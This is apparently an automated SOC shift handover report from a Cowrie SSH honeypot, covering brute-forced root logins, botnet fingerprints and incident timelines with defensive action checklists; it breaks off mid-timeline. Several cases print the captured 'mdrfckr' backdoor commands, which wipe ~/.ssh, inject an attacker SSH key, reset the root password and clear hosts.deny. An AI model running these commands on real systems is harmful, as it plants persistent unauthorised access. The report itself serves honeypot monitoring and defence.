# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-19 |
| **Generated At** | 2026-05-19T18:10:03Z |
| **Shift Time** | 18:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **101** |
| Confirmed Threats | **65** |
| False Positives Filtered | **36** (35.6%) |
| Unique Attacker IPs | **28** |
| Countries of Origin | **17** |
| High Severity Cases | **12** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **89** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **22** |
| Unique Credential Pairs | **14** |
| Unique Usernames | **7** |
| Unique Passwords | **14** |
| Successful Auth Pairs | **12** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 12 |
| `345gs5662d34` | 5 |
| `guest` | 1 |
| `user` | 1 |
| `ionguest` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |
| `abel` | 1 |
| `100877` | 1 |
| `qazxswedc` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `3245gs5662d34` | 5 |
| `root` | `abel` | 1 |
| `root` | `100877` | 1 |
| `root` | `qazxswedc` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `abel` | `152.32.218.149` | 2026-05-19T16:07:06 |
| `root` | `3245gs5662d34` | `152.32.218.149` | 2026-05-19T16:07:09 |
| `root` | `100877` | `180.100.217.164` | 2026-05-19T16:08:48 |
| `root` | `qazxswedc` | `152.244.200.198` | 2026-05-19T16:14:13 |
| `root` | `3245gs5662d34` | `152.244.200.198` | 2026-05-19T16:14:20 |
| `root` | `2084` | `49.229.102.187` | 2026-05-19T16:15:54 |
| `root` | `3245gs5662d34` | `49.229.102.187` | 2026-05-19T16:15:59 |
| `root` | `abcd@4321` | `43.153.80.54` | 2026-05-19T16:17:04 |
| `root` | `3245gs5662d34` | `43.153.80.54` | 2026-05-19T16:17:10 |
| `root` | `roott` | `180.103.119.98` | 2026-05-19T16:29:38 |
| `root` | `Fq123456` | `180.103.119.98` | 2026-05-19T16:34:25 |
| `root` | `3245gs5662d34` | `180.103.119.98` | 2026-05-19T16:34:33 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **101** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 42 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 34 | 6 |
| `03a80b21afa8...` | Modern SSH client | 6 | 3 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 34 | 6 | Mirai/variant |
| `03a80b21afa8...` | libssh | 6 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 2 | 1 | — |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:nImpNkrbYbS4"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `180.103.119.98`, `180.100.217.164`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `152.244.200.198`, `180.103.119.98`, `49.229.102.187`, `152.32.218.149`, `43.153.80.54`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **28** |
| Unique ASNs | **22** |
| High-Risk ASNs | **12** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | LOW |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS211298` | Driftnet Ltd | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (12)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b90821f56a4a

| Field | Detail |
|---|---|
| **Source IP** | `152.32.218[.]149` |
| **First Seen** | 2026-05-19 16:07 |
| **Last Seen** | 2026-05-19 16:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 16:07:06` | `cowrie.session.connect` |
| `2026-05-19 16:07:06` | `cowrie.client.version` |
| `2026-05-19 16:07:06` | `cowrie.client.kex` |
| `2026-05-19 16:07:06` | `cowrie.login.success` |
| `2026-05-19 16:07:06` | `cowrie.session.params` |
| `2026-05-19 16:07:06` | `cowrie.command.input` |
| `2026-05-19 16:07:06` | `cowrie.command.failed` |
| `2026-05-19 16:07:06` | `cowrie.log.closed` |
| `2026-05-19 16:07:07` | `cowrie.session.params` |
| `2026-05-19 16:07:07` | `cowrie.command.input` |
| `2026-05-19 16:07:07` | `cowrie.session.file_download` |
| `2026-05-19 16:07:07` | `cowrie.log.closed` |
| `2026-05-19 16:07:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.218[.]149` to AbuseIPDB if not already reported
- [ ] Block `152.32.218[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a712196c341e

| Field | Detail |
|---|---|
| **Source IP** | `152.32.218[.]149` |
| **First Seen** | 2026-05-19 16:07 |
| **Last Seen** | 2026-05-19 16:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 16:07:08` | `cowrie.session.connect` |
| `2026-05-19 16:07:08` | `cowrie.client.version` |
| `2026-05-19 16:07:08` | `cowrie.client.kex` |
| `2026-05-19 16:07:09` | `cowrie.login.success` |
| `2026-05-19 16:07:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.218[.]149` to AbuseIPDB if not already reported
- [ ] Block `152.32.218[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ffed0e185a7

| Field | Detail |
|---|---|
| **Source IP** | `180.100.217[.]164` |
| **First Seen** | 2026-05-19 16:08 |
| **Last Seen** | 2026-05-19 16:09 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:nImpNkrbYbS4"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 16:08:45` | `cowrie.session.connect` |
| `2026-05-19 16:08:45` | `cowrie.client.version` |
| `2026-05-19 16:08:45` | `cowrie.client.kex` |
| `2026-05-19 16:08:48` | `cowrie.login.success` |
| `2026-05-19 16:08:48` | `cowrie.session.params` |
| `2026-05-19 16:08:48` | `cowrie.command.input` |
| `2026-05-19 16:08:48` | `cowrie.command.failed` |
| `2026-05-19 16:08:49` | `cowrie.log.closed` |
| `2026-05-19 16:08:49` | `cowrie.session.params` |
| `2026-05-19 16:08:49` | `cowrie.command.input` |
| `2026-05-19 16:08:50` | `cowrie.session.file_download` |
| `2026-05-19 16:08:50` | `cowrie.log.closed` |
| `2026-05-19 16:09:07` | `cowrie.session.params` |
| `2026-05-19 16:09:07` | `cowrie.command.input` |
| `2026-05-19 16:09:07` | `cowrie.log.closed` |
| `2026-05-19 16:09:07` | `cowrie.session.params` |
| `2026-05-19 16:09:07` | `cowrie.command.input` |
| `2026-05-19 16:09:08` | `cowrie.log.closed` |
| `2026-05-19 16:09:09` | `cowrie.session.params` |
| `2026-05-19 16:09:09` | `cowrie.command.input` |
| `2026-05-19 16:09:09` | `cowrie.session.file_download` |
| `2026-05-19 16:09:09` | `cowrie.log.closed` |
| `2026-05-19 16:09:10` | `cowrie.session.params` |
| `2026-05-19 16:09:10` | `cowrie.command.input` |
| `2026-05-19 16:09:10` | `cowrie.log.closed` |
| `2026-05-19 16:09:11` | `cowrie.session.params` |
| `2026-05-19 16:09:11` | `cowrie.command.input` |
| `2026-05-19 16:09:11` | `cowrie.log.closed` |
| `2026-05-19 16:09:12` | `cowrie.session.params` |
| `2026-05-19 16:09:12` | `cowrie.command.input` |
| `2026-05-19 16:09:12` | `cowrie.command.input` |
| `2026-05-19 16:09:12` | `cowrie.log.closed` |
| `2026-05-19 16:09:13` | `cowrie.session.params` |
| `2026-05-19 16:09:13` | `cowrie.command.input` |
| `2026-05-19 16:09:13` | `cowrie.log.closed` |
| `2026-05-19 16:09:14` | `cowrie.session.params` |
| `2026-05-19 16:09:14` | `cowrie.command.input` |
| `2026-05-19 16:09:14` | `cowrie.log.closed` |
| `2026-05-19 16:09:15` | `cowrie.session.params` |
| `2026-05-19 16:09:15` | `cowrie.command.input` |
| `2026-05-19 16:09:15` | `cowrie.log.closed` |
| `2026-05-19 16:09:16` | `cowrie.session.params` |
| `2026-05-19 16:09:16` | `cowrie.command.input` |
| `2026-05-19 16:09:16` | `cowrie.log.closed` |
| `2026-05-19 16:09:17` | `cowrie.session.params` |
| `2026-05-19 16:09:17` | `cowrie.command.input` |
| `2026-05-19 16:09:17` | `cowrie.log.closed` |
| `2026-05-19 16:09:18` | `cowrie.session.params` |
| `2026-05-19 16:09:18` | `cowrie.command.input` |
| `2026-05-19 16:09:18` | `cowrie.log.closed` |
| `2026-05-19 16:09:19` | `cowrie.session.params` |
| `2026-05-19 16:09:19` | `cowrie.command.input` |
| `2026-05-19 16:09:20` | `cowrie.log.closed` |
| `2026-05-19 16:09:20` | `cowrie.session.params` |
| `2026-05-19 16:09:20` | `cowrie.command.input` |
| `2026-05-19 16:09:20` | `cowrie.log.closed` |
| `2026-05-19 16:09:22` | `cowrie.session.params` |
| `2026-05-19 16:09:22` | `cowrie.command.input` |
| `2026-05-19 16:09:22` | `cowrie.log.closed` |
| `2026-05-19 16:09:24` | `cowrie.session.params` |
| `2026-05-19 16:09:24` | `cowrie.command.input` |
| `2026-05-19 16:09:24` | `cowrie.log.closed` |
| `2026-05-19 16:09:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.100.217[.]164` to AbuseIPDB if not already reported
- [ ] Block `180.100.217[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09342408d637

| Field | Detail |
|---|---|
| **Source IP** | `152.244.200[.]198` |
| **First Seen** | 2026-05-19 16:14 |
| **Last Seen** | 2026-05-19 16:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 16:14:11` | `cowrie.session.connect` |
| `2026-05-19 16:14:11` | `cowrie.client.version` |
| `2026-05-19 16:14:12` | `cowrie.client.kex` |
| `2026-05-19 16:14:13` | `cowrie.login.success` |
| `2026-05-19 16:14:13` | `cowrie.session.params` |
| `2026-05-19 16:14:13` | `cowrie.command.input` |
| `2026-05-19 16:14:13` | `cowrie.command.failed` |
| `2026-05-19 16:14:14` | `cowrie.log.closed` |
| `2026-05-19 16:14:15` | `cowrie.session.params` |
| `2026-05-19 16:14:15` | `cowrie.command.input` |
| `2026-05-19 16:14:15` | `cowrie.session.file_download` |
| `2026-05-19 16:14:15` | `cowrie.log.closed` |
| `2026-05-19 16:14:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.244.200[.]198` to AbuseIPDB if not already reported
- [ ] Block `152.244.200[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-354006a70cd8

| Field | Detail |
|---|---|
| **Source IP** | `152.244.200[.]198` |
| **First Seen** | 2026-05-19 16:14 |
| **Last Seen** | 2026-05-19 16:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 16:14:18` | `cowrie.session.connect` |
| `2026-05-19 16:14:18` | `cowrie.client.version` |
| `2026-05-19 16:14:19` | `cowrie.client.kex` |
| `2026-05-19 16:14:20` | `cowrie.login.success` |
| `2026-05-19 16:14:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.244.200[.]198` to AbuseIPDB if not already reported
- [ ] Block `152.244.200[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-852d1262613e

| Field | Detail |
|---|---|
| **Source IP** | `49.229.102[.]187` |
| **First Seen** | 2026-05-19 16:15 |
| **Last Seen** | 2026-05-19 16:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 16:15:53` | `cowrie.session.connect` |
| `2026-05-19 16:15:53` | `cowrie.client.version` |
| `2026-05-19 16:15:53` | `cowrie.client.kex` |
| `2026-05-19 16:15:54` | `cowrie.login.success` |
| `2026-05-19 16:15:54` | `cowrie.session.params` |
| `2026-05-19 16:15:54` | `cowrie.command.input` |
| `2026-05-19 16:15:54` | `cowrie.command.failed` |
| `2026-05-19 16:15:55` | `cowrie.log.closed` |
| `2026-05-19 16:15:55` | `cowrie.session.params` |
| `2026-05-19 16:15:55` | `cowrie.command.input` |
| `2026-05-19 16:15:55` | `cowrie.session.file_download` |
| `2026-05-19 16:15:55` | `cowrie.log.closed` |
| `2026-05-19 16:15:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.229.102[.]187` to AbuseIPDB if not already reported
- [ ] Block `49.229.102[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b9b6f655fde

| Field | Detail |
|---|---|
| **Source IP** | `49.229.102[.]187` |
| **First Seen** | 2026-05-19 16:15 |
| **Last Seen** | 2026-05-19 16:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 16:15:58` | `cowrie.session.connect` |
| `2026-05-19 16:15:58` | `cowrie.client.version` |
| `2026-05-19 16:15:58` | `cowrie.client.kex` |
| `2026-05-19 16:15:59` | `cowrie.login.success` |
| `2026-05-19 16:15:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.229.102[.]187` to AbuseIPDB if not already reported
- [ ] Block `49.229.102[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53f1089d261e

| Field | Detail |
|---|---|
| **Source IP** | `43.153.80[.]54` |
| **First Seen** | 2026-05-19 16:17 |
| **Last Seen** | 2026-05-19 16:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 16:17:03` | `cowrie.session.connect` |
| `2026-05-19 16:17:03` | `cowrie.client.version` |
| `2026-05-19 16:17:03` | `cowrie.client.kex` |
| `2026-05-19 16:17:04` | `cowrie.login.success` |
| `2026-05-19 16:17:04` | `cowrie.session.params` |
| `2026-05-19 16:17:04` | `cowrie.command.input` |
| `2026-05-19 16:17:04` | `cowrie.command.failed` |
| `2026-05-19 16:17:05` | `cowrie.log.closed` |
| `2026-05-19 16:17:05` | `cowrie.session.params` |
| `2026-05-19 16:17:05` | `cowrie.command.input` |
| `2026-05-19 16:17:05` | `cowrie.session.file_download` |
| `2026-05-19 16:17:05` | `cowrie.log.closed` |
| `2026-05-19 16:17:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.80[.]54` to AbuseIPDB if not already reported
- [ ] Block `43.153.80[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dcabd957f18

| Field | Detail |
|---|---|
| **Source IP** | `43.153.80[.]54` |
| **First Seen** | 2026-05-19 16:17 |
| **Last Seen** | 2026-05-19 16:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 16:17:09` | `cowrie.session.connect` |
| `2026-05-19 16:17:09` | `cowrie.client.version` |
| `2026-05-19 16:17:09` | `cowrie.client.kex` |
| `2026-05-19 16:17:10` | `cowrie.login.success` |
| `2026-05-19 16:17:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.80[.]54` to AbuseIPDB if not already reported
- [ ] Block `43.153.80[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a85004472e1

| Field | Detail |
|---|---|
| **Source IP** | `180.103.119[.]98` |
| **First Seen** | 2026-05-19 16:29 |
| **Last Seen** | 2026-05-19 16:30 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:TBLakzrQLCdF"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 16:29:37` | `cowrie.session.connect` |
| `2026-05-19 16:29:37` | `cowrie.client.version` |
| `2026-05-19 16:29:37` | `cowrie.client.kex` |
